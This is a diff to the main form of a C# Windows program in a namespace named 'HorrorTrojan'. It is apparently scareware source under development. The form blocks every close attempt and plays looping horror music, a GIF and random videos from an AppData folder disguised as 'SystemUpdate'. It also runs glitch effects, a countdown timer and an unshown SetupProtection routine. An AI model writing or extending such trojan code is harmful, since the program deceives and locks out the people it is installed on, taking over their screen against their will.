@@ -1,4 +1,4 @@
-// MainInterface.cs - Упрощенная версия
+// MainInterface.cs
 using System;
 using System.Drawing;
 using System.Windows.Forms;
@@ -6,14 +6,12 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.IO;
 using System.Diagnostics;
-using System.Reflection;
 using System.Media;
 
 namespace HorrorTrojan
 {
     public partial class MainInterface : Form
     {
-        // WinAPI для GDI эффектов
         [DllImport("user32.dll")]
         private static extern IntPtr GetDesktopWindow();
         [DllImport("user32.dll")]
@@ -48,18 +46,20 @@ namespace HorrorTrojan
         private Label timerLabel;
         private Panel bottomPanel;
         private Image gifImage;
-        private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
+        private SoundPlayer musicPlayer;
 
         public MainInterface()
         {
-            // ПРОСТАЯ ИНИЦИАЛИЗАЦИЯ БЕЗ ОШИБОК
             InitializeComponent();
             SetupForm();
-            LoadResourcesSimple();
+            LoadResources();
             StartTimers();
             SetupProtection();
-            PlayMusicSimple();
+            PlayMusic();
+
+            this.Show();
+            this.BringToFront();
         }
 
         private void InitializeComponent()
@@ -103,10 +103,6 @@ namespace HorrorTrojan
 
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
             this.ResumeLayout(false);
-
-            // ПРИНУДИТЕЛЬНО ПОКАЗЫВАЕМ
-            this.Show();
-            this.BringToFront();
         }
 
         private void SetupForm()
@@ -114,48 +110,31 @@ namespace HorrorTrojan
             this.FormClosing += (s, e) => e.Cancel = true;
         }
 
-        private void LoadResourcesSimple()
+        private void LoadResources()
         {
             try
             {
-                // ПРОСТАЯ ЗАГРУЗКА ЧЕРЕЗ GetManifestResourceStream
-                var assembly = Assembly.GetExecutingAssembly();
-                using (var stream = assembly.GetManifestResourceStream("hr.gif"))
+                string gifPath = Path.Combine(appDataPath, "hr.gif");
+                if (File.Exists(gifPath))
                 {
-                    if (stream != null)
-                    {
-                        gifImage = Image.FromStream(stream);
-                        this.pictureBox.Image = gifImage;
-                        this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
-                        // Запускаем анимацию
-                        ImageAnimator.Animate(gifImage, (s, e) => { this.pictureBox.Invalidate(); });
-                    }
-                    else
-                    {
-                        // Если GIF не найден - просто заливаем красным
-                        this.pictureBox.BackColor = Color.Red;
-                    }
+                    gifImage = Image.FromFile(gifPath);
+                    this.pictureBox.Image = gifImage;
+                    this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+                    ImageAnimator.Animate(gifImage, (s, e) => { this.pictureBox.Invalidate(); });
                 }
             }
-            catch
-            {
-                // Если ошибка - заливаем красным
-                this.pictureBox.BackColor = Color.Red;
-            }
+            catch { }
         }
 
-        private void PlayMusicSimple()
+        private void PlayMusic()
         {
             try
             {
-                // ПРОСТОЙ СПОСОБ ЗАПУСТИТЬ МУЗЫКУ
                 string musicPath = Path.Combine(appDataPath, "dv.mp3");
                 if (File.Exists(musicPath))
                 {
-                    using (var player = new SoundPlayer(musicPath))
-                    {
-                        player.PlayLooping();
-                    }
+                    musicPlayer = new SoundPlayer(musicPath);
+                    musicPlayer.PlayLooping();
                 }
             }
             catch { }
@@ -256,6 +235,7 @@ namespace HorrorTrojan
         {
             try
             {
+                string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
                 string videoPath = Path.Combine(appDataPath, videoFiles[rnd.Next(videoFiles.Length)]);
                 if (File.Exists(videoPath))
                 {
@@ -371,6 +351,7 @@ namespace HorrorTrojan
                 mainTimer?.Dispose();
                 glitchTimer?.Dispose();
                 videoTimer?.Dispose();
+                musicPlayer?.Dispose();
                 gifImage?.Dispose();
             }
             base.Dispose(disposing);
